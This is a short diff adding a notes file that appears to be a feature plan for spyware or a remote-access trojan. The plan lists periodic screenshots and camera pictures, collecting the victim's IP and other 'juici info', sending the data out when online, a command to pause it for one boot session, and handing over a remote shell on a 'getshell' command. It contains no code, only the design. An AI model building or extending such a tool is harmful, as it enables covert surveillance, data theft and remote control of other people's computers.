@@ -1,0 +1,10 @@
+Take screenshot, take pic (every 30 min, get ip, all juici info)
+
+Disable that for this boot session only with hot command
+
+set 0time to 6 if not set 
+
+if not 0time yet and no internet, save date
+else, senData
+
+if getshell command found, hand shell over
